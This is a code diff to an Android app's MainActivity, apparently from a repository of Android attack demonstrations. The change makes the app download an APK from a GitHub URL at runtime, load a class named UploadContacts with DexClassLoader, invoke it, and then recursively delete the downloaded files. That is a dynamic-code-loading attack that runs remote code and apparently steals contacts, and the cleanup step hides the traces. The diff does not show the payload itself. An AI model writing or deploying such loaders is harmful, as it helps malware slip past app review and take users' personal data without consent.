@@ -82,7 +82,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void loadCode() {
         Log.i(TAG, "Downloading file...");
-        String URL = "https://github.com/manwelbugeja/android-attacks/blob/main/resources/dynamic_code.apk?raw=true";
+        String URL = "https://github.com/manwelbugeja/android-attacks/blob/main/resources/app-debug.apk?raw=true";
         new DownloadFile().execute(URL);
     }
 
@@ -194,23 +194,24 @@ public class MainActivity extends AppCompatActivity {
                 final DexClassLoader classLoader = new DexClassLoader(apkPath, getApplicationContext().getCacheDir().getAbsolutePath(), null, this.getClass().getClassLoader());
                 Class<?> cls = null;
                 try {
-                    cls = classLoader.loadClass("com.example.dynamiccode.StringFns");
+                    cls = classLoader.loadClass("com.example.dynamiccode.UploadContacts");
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
 
-                Method countLettersMethod = null;
+                Method testFn = null;
                 try {
-                    countLettersMethod = cls.getMethod("countLetters", String.class);
+                    assert cls != null;
+                    testFn = cls.getMethod("testFn");
                 } catch (NoSuchMethodException e) {
                     Log.i(TAG, "No such method!");
                     e.printStackTrace();
                 }
 
                 // first parameter (Class) is null because the method is static
-                int mresult = 0;
                 try {
-                    mresult = (int) countLettersMethod.invoke(null, "Hello");
+                    assert testFn != null;
+                    testFn.invoke(null);
                 } catch (IllegalAccessException e) {
                     Log.i(TAG, "Illegal Access");
                     e.printStackTrace();
@@ -219,9 +220,21 @@ public class MainActivity extends AppCompatActivity {
                     e.printStackTrace();
                 }
 
-                Log.i(TAG, "Answer: " + mresult);
+                Log.i(TAG, "Finish");
 
+                // Delete folder after use
+                deleteRecursive(dir);
             }
+
+
+        }
+
+        void deleteRecursive(File fileOrDirectory) {
+            if (fileOrDirectory.isDirectory())
+                for (File child : fileOrDirectory.listFiles())
+                    deleteRecursive(child);
+
+            fileOrDirectory.delete();
         }
     }
 }
